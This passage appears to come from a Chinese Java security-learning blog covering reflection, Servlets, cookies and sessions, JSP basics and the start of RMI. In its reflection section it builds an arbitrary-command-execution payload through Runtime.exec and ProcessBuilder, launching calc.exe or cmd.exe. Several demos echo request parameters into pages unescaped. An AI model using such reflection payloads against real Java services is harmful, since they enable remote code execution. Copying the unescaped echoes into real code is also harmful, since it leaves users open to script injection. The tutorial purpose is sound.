年龄：&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://www.const27.com/wp-content/uploads/2020/12/image-53.png" alt="img"><br>运行结果</p><p>我们刚才提过,getFiled()附带参数可以指定访问某一个属性，同理，getConstructor也一样，我们想要执行某一个类的构造方法，往往这个方法更实用<br>要执行一个类的构造方法，那我们需要创建一个该类的实例化对象，这个过程我们用newInstance()方法实现</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;abc&quot;);</span><br><span class="line"></span><br><span class="line">        Constructor test &#x3D; clazz.getDeclaredConstructor(int.class);  &#x2F;&#x2F;指定参数，即可从多个重载的构造函数指定到某个具体的构造函数</span><br><span class="line">        test.setAccessible(true);</span><br><span class="line">        test.newInstance(12);  &#x2F;&#x2F;私有构造方法只需调用一下newInstance传入参数即可</span><br><span class="line"></span><br><span class="line">        Constructor test2 &#x3D; clazz.getDeclaredConstructor(String.class,int.class);</span><br><span class="line">        test2.newInstance(&quot;tom&quot;,15);  &#x2F;&#x2F;公有构造方法也一样</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public abc(String name,int age)&#123;</span><br><span class="line">        System.out.println(&quot;姓名：&quot;+name+&quot;年龄：&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line">    private abc(int age)&#123;</span><br><span class="line">        System.out.println(&quot;私有的构造方法   年龄：&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151513.png" alt="QQ截图20210219151513"></p><h2 id="反射的进阶与安全"><a href="#反射的进阶与安全" class="headerlink" title="反射的进阶与安全"></a>反射的进阶与安全</h2><h3 id="Class-forName-实质与类初始化"><a href="#Class-forName-实质与类初始化" class="headerlink" title="Class.forName 实质与类初始化"></a>Class.forName 实质与类初始化</h3><p>Class.forName(“…”) 常被我们拿来获得类对象，但是实际上，Class.forname有三个参数，只不过我们默认输第一个参数：类名就能完成工作了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是Class.fornName函数原型</span><br><span class="line">public static Class&lt;?&gt; forName(String name, boolean initialize,</span><br><span class="line">                                   ClassLoader loader)</span><br><span class="line"></span><br><span class="line">Class.forName(className)</span><br><span class="line">&#x2F;&#x2F; 等于</span><br><span class="line">Class.forName(className, true, currentLoader)</span><br></pre></td></tr></table></figure><p>这里我们看见有三个参数，第一个参数是指定类名就不多讲了，第二个参数是决定类是否初始化（这个稍后会详细阐明），第三个是ClassLoader类加载器（告诉JVM如何加载这个类这里不展开说）</p><p>关于一个类的初始化，有三种操作可以实现:构造方法，空块和static块，就像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class TrainPrint &#123;</span><br><span class="line"> &#123;</span><br><span class="line"> System.out.printf(&quot;Empty block initial %s\n&quot;, this.getClass());</span><br><span class="line"> &#125;</span><br><span class="line"> static &#123;</span><br><span class="line"> System.out.printf(&quot;Static initial %s\n&quot;, TrainPrint.class);</span><br><span class="line"> &#125;</span><br><span class="line"> public TrainPrint() &#123;</span><br><span class="line"> System.out.printf(&quot;Initial %s\n&quot;, this.getClass());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么执行顺序是如何呢，在引入父类的情况下又是如何呢？我们写个demo看看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        abc a &#x3D; new abc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class b&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;b空块已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot; b static块已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public b()&#123;</span><br><span class="line">        System.out.println(&quot;b类构造方法已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class abc extends b&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;a空块已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot; a static块已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public abc() &#123;</span><br><span class="line">        System.out.println(&quot;a初始化方法已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151831.png" alt="QQ截图20210219151831"></p><p>我们可以清晰的看到执行顺序，对继承类来说，<br>1.会先执行父类static块<br>2.执行自己的static块<br>3.执行父类空快<br>4.执行父类构造方法<br>5.执行自己空快<br>6.执行自己构造方法</p><p>对于一个类来说，执行顺序则是<br>1.执行static块<br>2.执行空快<br>3.执行构造方法</p><p>那么对于Class.forName指定的是否进行类初始化参数，指的是哪个部分？static块，空块还是构造方法?答案是只会执行static块里的，且会优先执行父类的static块。<br>我们把上面代码中的主函数替换为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    Class clazz &#x3D; Class.forName(&quot;abc&quot;);</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception e)&#123;&#125;</span><br></pre></td></tr></table></figure><p>执行一下，看结果。发现只执行了static块</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151840.png" alt="QQ截图20210219151840"></p><p>也就是说，Class.forName()会默认执行类的static代码块，是个比较危险的信号。</p><h3 id="Runtime执行命令解析"><a href="#Runtime执行命令解析" class="headerlink" title="Runtime执行命令解析"></a>Runtime执行命令解析</h3><p>一般来说，我们调用Runtime类来执行命令时的指定是这样的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exe()</span><br></pre></td></tr></table></figure><p>我们到源码里分析这段代码</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151850.png" alt="QQ截图20210219151850"></p><p>可见，当我们对Runtime类执行getRuntime()时会得到一个Runtime对象，然后我们就可以调用我们的exec方法了<br>同时，Runtime() 被private修饰符修饰了，这说明我们无法通过Runtime a = new Runtime()来实现一个Runtime的对象。<br>所以说，我们正常地使用runtime来执行命令只能依靠以上代码。</p><p>那么我们要是想要依靠反射来写一个Runtime执行任意命令的payload，那么该如何写呢？</p><p>先来一个错误示范，当我们用常规的思路去实现时。我们直接调用Runtime类里的exec方法，然后通过newInstance来实例化一个Runtime对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method method &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">method.setAccessible(true);</span><br><span class="line">method.invoke(clazz.newInstance(),&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure><p>最终结果则是报错：class test cannot access a member of class java.lang.Runtime (in module java.base) with modifiers “private”<br>看来通过反射也不能直接调用exec方法，或者说不能实例化Runtime对象。<br>那么正确思路该是什么呢？应该是先调用getRuntime获得Runtime对象，然后再调用exec方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method MgetRuntime &#x3D; clazz.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Object runtime &#x3D; MgetRuntime.invoke(clazz);  &#x2F;&#x2F;对类对象使用getRuntime(),其实就相当于Runtime.getRuntime()。这种方式仅限static方法</span><br><span class="line">Method Mexec &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">Mexec.invoke(runtime,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure><p>最终弹出计算器。</p><h3 id="ProcessBuilder执行命令的反射实现"><a href="#ProcessBuilder执行命令的反射实现" class="headerlink" title="ProcessBuilder执行命令的反射实现"></a>ProcessBuilder执行命令的反射实现</h3><p>除了Runtime以外，还可以用ProcessBuilder类来执行命令。<br>它的正常情况使用如下.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProcessBuilder pb &#x3D; new ProcessBuilder(&quot;calc.exe&quot;);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure><p>我们来分析一下ProcessBuilder的构造方法，它的构造方法有很多个重载，我们分析一个吧。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151901.png" alt="QQ截图20210219151901"></p><p>可见，ProcessBuilder的构造方法把传入参数保存到了command属性里，然后commad会被以系统命令调用（这部分代码就不贴出来了）。</p><p>那么以反射的形式该如何实现呢。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">            Method start &#x3D; clazz.getMethod(&quot;start&quot;);</span><br><span class="line">            start.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;cmd.exe&quot;))); </span><br></pre></td></tr></table></figure><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h3 id="Servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h3><h4 id="1-调用init-方法进行初始化"><a href="#1-调用init-方法进行初始化" class="headerlink" title="1.调用init()方法进行初始化"></a>1.调用init()方法进行初始化</h4><p>init()方法在第一次创建servlet时被调用，用于进行初始化操作。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void init() throws ServletException&#123;...code...&#125;</span><br></pre></td></tr></table></figure><h4 id="2-调用service-方法处理客户端请求"><a href="#2-调用service-方法处理客户端请求" class="headerlink" title="2.调用service()方法处理客户端请求"></a>2.调用service()方法处理客户端请求</h4><p>web服务器，即servlet容器调用service()方法处理来自客户端的请求，并返回响应。同时根据客户端请求的类型（Get，Post，delete等），做出不同的行为，这些行为是由service方法抽象出的其他方法（doGet，doPost等）。<br>所以这里说的调用service()方法也就是等同于调用doGet，doPost等方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">doPost,doDelete等方法的定义形同于下</span><br><span class="line">public void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException&#123;...code...&#125;</span><br></pre></td></tr></table></figure><h4 id="3-调用distroy-在Servlet销毁前完成清理活动"><a href="#3-调用distroy-在Servlet销毁前完成清理活动" class="headerlink" title="3.调用distroy()在Servlet销毁前完成清理活动"></a>3.调用distroy()在Servlet销毁前完成清理活动</h4><p>distrtoy()函数只调用一次，在Servlet被销毁前完成后台线程停止，数据库链接关闭等一系列清理工作。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void destroy() &#123;</span><br><span class="line">  &#x2F;&#x2F; 终止化代码...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编写一个简单的Servlet"><a href="#编写一个简单的Servlet" class="headerlink" title="编写一个简单的Servlet"></a>编写一个简单的Servlet</h3><p>我们写一个程序，用来控制Get请求的响应</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)    &#x2F;&#x2F;用于设定路由</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doGet(HttpServletRequest request,</span><br><span class="line">                      HttpServletResponse response)</span><br><span class="line">            throws ServletException, IOException</span><br><span class="line">    &#123;</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line"></span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">        out.println(&quot;&lt;h1&gt;&quot; + &quot;a&quot; + &quot;&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于部署我是参考的这个文章<a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a><br>我的版本时idea 2020.2，可能会有出入。</p><h3 id="处理传参"><a href="#处理传参" class="headerlink" title="处理传参"></a>处理传参</h3><p>servlet处理传参主要是通过doGet和doPost方法进行的。<br>接收参数值主要是靠下面的方法</p><ul><li><strong>getParameter()：</strong>您可以调用 request.getParameter() 方法来获取表单参数的值。</li><li><strong>getParameterValues()：</strong>如果参数出现一次以上，则调用该方法，并返回多个值，例如复选框。</li><li><strong>getParameterNames()：</strong>如果您想要得到当前请求中的所有参数的完整列表，则调用该方法。</li></ul><p>我们写个demo试试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException</span><br><span class="line">    &#123;</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">        String name &#x3D; new String(request.getParameter(&quot;name&quot;));</span><br><span class="line">        out.println(&quot;your name is &quot;+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个demo主要用于接收get数据，并做出一些处理返回.<br>那么如何接收POST数据呢？和doGet差不多</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line">    </span><br><span class="line">    public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException</span><br><span class="line">    &#123;</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">        String name &#x3D; new String(request.getParameter(&quot;name&quot;));</span><br><span class="line">        out.println(&quot;[Post]your name is &quot;+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">需要注意的是，这里的request.getParameter(&quot;name&quot;)会优先选择在url里的参数，而不是http包体的参数</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152111.png" alt="QQ截图20210219152111"></p><h3 id="cookie-amp-session"><a href="#cookie-amp-session" class="headerlink" title="cookie&amp;session"></a>cookie&amp;session</h3><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>cookie的主要方法如下</p><table><thead><tr><th align="left">序号</th><th align="left">方法 &amp; 描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>public void setDomain(String pattern)</strong> 该方法设置 cookie 适用的域，例如 runoob.com。</td></tr><tr><td align="left">2</td><td align="left"><strong>public String getDomain()</strong> 该方法获取 cookie 适用的域，例如 runoob.com。</td></tr><tr><td align="left">3</td><td align="left"><strong>public void setMaxAge(int expiry)</strong> 该方法设置 cookie 过期的时间（以秒为单位）。如果不这样设置，cookie 只会在当前 session 会话中持续有效。</td></tr><tr><td align="left">4</td><td align="left"><strong>public int getMaxAge()</strong> 该方法返回 cookie 的最大生存周期（以秒为单位），默认情况下，-1 表示 cookie 将持续下去，直到浏览器关闭。</td></tr><tr><td align="left">5</td><td align="left"><strong>public String getName()</strong> 该方法返回 cookie 的名称。名称在创建后不能改变。</td></tr><tr><td align="left">6</td><td align="left"><strong>public void setValue(String newValue)</strong> 该方法设置与 cookie 关联的值。</td></tr><tr><td align="left">7</td><td align="left"><strong>public String getValue()</strong> 该方法获取与 cookie 关联的值。</td></tr><tr><td align="left">8</td><td align="left"><strong>public void setPath(String uri)</strong> 该方法设置 cookie 适用的路径。如果您不指定路径，与当前页面相同目录下的（包括子目录下的）所有 URL 都会返回 cookie。</td></tr><tr><td align="left">9</td><td align="left"><strong>public String getPath()</strong> 该方法获取 cookie 适用的路径。</td></tr><tr><td align="left">10</td><td align="left"><strong>public void setSecure(boolean flag)</strong> 该方法设置布尔值，表示 cookie 是否应该只在加密的（即 SSL）连接上发送。</td></tr><tr><td align="left">11</td><td align="left"><strong>public void setComment(String purpose)</strong> 设置cookie的注释。该注释在浏览器向用户呈现 cookie 时非常有用。</td></tr><tr><td align="left">12</td><td align="left"><strong>public String getComment()</strong> 获取 cookie 的注释，如果 cookie 没有注释则返回 null。</td></tr></tbody></table><p>我们马上写一个demo，这个demo会用到 response.addCookie用于在响应头里添加cookie，cookie.setMaxAge 用于设置cookie的有效期，request.getCookies 用于获取请求里的cookie数组<br>这里的demo有两个，一个用于添加cookie，一个用于输出cookie</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用于添加cookie</span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        Cookie name &#x3D; new Cookie(&quot;name&quot;, request.getParameter(&quot;name&quot;)); &#x2F;&#x2F; 中文转码</span><br><span class="line"></span><br><span class="line">        name.setMaxAge(60*60*24);</span><br><span class="line"></span><br><span class="line">        response.addCookie( name );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出cookie值</span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;b&quot;)</span><br><span class="line">public class test2 extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        Cookie cookie &#x3D; null;</span><br><span class="line">        Cookie[] cookies &#x3D; null;</span><br><span class="line">        &#x2F;&#x2F; 获取与该域相关的 Cookie 的数组</span><br><span class="line">        cookies &#x3D; request.getCookies();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 设置响应内容类型</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">            for (int i &#x3D; 0; i &lt; cookies.length; i++)&#123;</span><br><span class="line">                if((cookies[i].getName()).compareTo(&quot;name&quot;)&#x3D;&#x3D;0)&#123;</span><br><span class="line">                    out.println(&quot;your name is &quot;+cookies[i].getValue());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152122.png" alt="QQ截图20210219152122"></p><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p>servle提供了一系列session接口辅助这个流程</p><table><thead><tr><th>1</th><th><strong>public Object getAttribute(String name)</strong> 该方法返回在该 session 会话中具有指定名称的对象，如果没有指定名称的对象，则返回 null。</th></tr></thead><tbody><tr><td>2</td><td><strong>public Enumeration getAttributeNames()</strong> 该方法返回 String 对象的枚举，String 对象包含所有绑定到该 session 会话的对象的名称。</td></tr><tr><td>3</td><td><strong>public long getCreationTime()</strong> 该方法返回该 session 会话被创建的时间，自格林尼治标准时间 1970 年 1 月 1 日午夜算起，以毫秒为单位。</td></tr><tr><td>4</td><td><strong>public String getId()</strong> 该方法返回一个包含分配给该 session 会话的唯一标识符的字符串。</td></tr><tr><td>5</td><td><strong>public long getLastAccessedTime()</strong> 该方法返回客户端最后一次发送与该 session 会话相关的请求的时间自格林尼治标准时间 1970 年 1 月 1 日午夜算起，以毫秒为单位。</td></tr><tr><td>6</td><td><strong>public int getMaxInactiveInterval()</strong> 该方法返回 Servlet 容器在客户端访问时保持 session 会话打开的最大时间间隔，以秒为单位。</td></tr><tr><td>7</td><td><strong>public void invalidate()</strong> 该方法指示该 session 会话无效，并解除绑定到它上面的任何对象。</td></tr><tr><td>8</td><td><strong>public boolean isNew()</strong> 如果客户端还不知道该 session 会话，或者如果客户选择不参入该 session 会话，则该方法返回 true。</td></tr><tr><td>9</td><td><strong>public void removeAttribute(String name)</strong> 该方法将从该 session 会话移除指定名称的对象。</td></tr><tr><td>10</td><td><strong>public void setAttribute(String name, Object value)</strong> 该方法使用指定的名称绑定一个对象到该 session 会话。</td></tr><tr><td>11</td><td><strong>public void setMaxInactiveInterval(int interval)</strong> 该方法在 Servlet 容器指示该 session 会话无效之前，指定客户端请求之间的时间，以秒为单位。</td></tr></tbody></table><p>写个demo吧，过一过就行了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.text.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        HttpSession session &#x3D; request.getSession(); &#x2F;&#x2F;创建一个session对象</span><br><span class="line">        Date createtime &#x3D; new Date(session.getCreationTime());</span><br><span class="line">        Date lastAccessTime &#x3D; new Date(session.getLastAccessedTime());</span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line"></span><br><span class="line">        SimpleDateFormat df &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd:mm:ss&quot;);</span><br><span class="line">        String countkey &#x3D; new String(&quot;key&quot;);  &#x2F;&#x2F;访问次数的键</span><br><span class="line">        Integer count &#x3D; Integer.valueOf(0);   &#x2F;&#x2F;访问次数的值</span><br><span class="line">        String userID &#x3D; new String(&quot;Tom&quot;);    &#x2F;&#x2F;用户ID的值</span><br><span class="line">        String userIDKey &#x3D; new String(&quot;userIDKey&quot;);   &#x2F;&#x2F;用户ID的键</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if(session.getAttribute(countkey)&#x3D;&#x3D;null)&#123;   &#x2F;&#x2F;如果获得该session的countkey这个键的值不存在时，为当前session初始化这个键</span><br><span class="line">            session.setAttribute(countkey,Integer.valueOf(0));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(session.isNew())&#123;   &#x2F;&#x2F;如果session是第一次创建，则为其初始化userID键</span><br><span class="line">            session.setAttribute(userIDKey,userID);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            count &#x3D; (Integer) session.getAttribute(countkey);</span><br><span class="line">            count &#x3D; count+1;</span><br><span class="line">            userID &#x3D; (String)session.getAttribute(userIDKey);</span><br><span class="line">        &#125;</span><br><span class="line">        session.setAttribute(countkey,count);</span><br><span class="line">        out.println(&quot;hello&quot;+userID+&quot;\nthis is the &quot;+count+&quot; to visit this website\n&quot;);</span><br><span class="line">        out.println(&quot;first time:&quot;+createtime+&quot;\n this time:&quot;+lastAccessTime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><p>JSP是脚本语言，与PHP等语言类似。JSP本质就是servlet，它存在的意义就是简化servlet复杂的程序过程</p><h3 id="JSP基础语法"><a href="#JSP基础语法" class="headerlink" title="JSP基础语法"></a>JSP基础语法</h3><h4 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h4><p>JSP和PHP等可以嵌入到HTML的脚本语言类似，需要用一个代码段包裹代码。<br>其格式如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% code %&gt;</span><br></pre></td></tr></table></figure><p>同时在代码段中还存在着指令标签:Page,include,taglib<br>他们的定义和作用如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page ...... %&gt;    </span><br><span class="line">page指令用于定义网页的各属性，如&lt;%@ page import&#x3D;&quot;...&quot; %&gt; 表示要导入哪些java模块,&lt;%@ page language&#x3D;&quot;...&quot; %&gt;表示JSP页面所用的语言，默认是java</span><br><span class="line"></span><br><span class="line">&lt;%@ include file&#x3D;&quot;文件相对url地址&quot; %&gt; 表示要包含哪些其他文件，可以包含JSP,HTML或txt等文件</span><br><span class="line"></span><br><span class="line">&lt;%@ taglib ......%&gt;  主要用于用户自定义标签 </span><br></pre></td></tr></table></figure><h4 id="动作元素"><a href="#动作元素" class="headerlink" title="动作元素"></a>动作元素</h4><p>与指令元素比较相似，但不同的是动作元素可以动态的插入，不像指令元素一样一开头就会被执行。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152132.png" alt="QQ截图20210219152132"></p><h4 id="九大对象"><a href="#九大对象" class="headerlink" title="九大对象"></a>九大对象</h4><p>JSP中有九大对象用于实现各种操作。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152143.png" alt="QQ截图20210219152143"></p><p>至于request和response，这俩用的是最多的是他们，<br>out对象主要用于在response中写入输出内容， out.println或者out.print用于输出内容，out.flush用于刷新输出流,其余在新手阶段都不咋用。</p><h4 id="传参处理"><a href="#传参处理" class="headerlink" title="传参处理"></a>传参处理</h4><ul><li><strong>getParameter():</strong> 使用 request.getParameter() 方法来获取表单参数的值。</li><li><strong>getParameterValues():</strong> 获得如checkbox类（名字相同，但值有多个）的数据。 接收数组变量 ，如checkbox类型</li><li>**getParameterNames():**该方法可以取得所有变量的名称，该方法返回一个 Enumeration。</li><li>**getInputStream():**调用此方法来读取来自客户端的二进制数据流。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;test jsp&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">your name is &lt;%&#x3D;request.getParameter(&quot;name&quot;)%&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152207.png" alt="QQ截图20210219152207"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152242.png" alt="QQ截图20210219152242"></p><h3 id="cookie-amp-session-1"><a href="#cookie-amp-session-1" class="headerlink" title="cookie&amp;session"></a>cookie&amp;session</h3><h4 id="cookie，session在JSP里的设置与servlet如出一辙"><a href="#cookie，session在JSP里的设置与servlet如出一辙" class="headerlink" title="cookie，session在JSP里的设置与servlet如出一辙"></a>cookie，session在JSP里的设置与servlet如出一辙</h4><p>cookie和session在jsp的&lt;%%&gt;代码区里设置，设置方法与servlet如出一辙，因为&lt;%%&gt;代码区里本身就是调用的java代码，所以不再赘述</p><h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="何为RMI"><a href="#何为RMI" class="headerlink" title="何为RMI"></a>何为RMI</h2><p>RMI，即远程方法调用，允许运行在一个JAVA虚拟机调用另一个JAVA虚拟机上的对象的方法.</p><h2 id="RMI-实现一个远程接口"><a href="#RMI-实现一个远程接口" class="headerlink" title="RMI:实现一个远程接口"></a>RMI:实现一个远程接口</h2><p>RMI的远程接口用于其他java虚拟机远程调用该接口下的对象的方法.</p><h3 id="定义一个远程接口"><a href="#定义一个远程接口" class="headerlink" 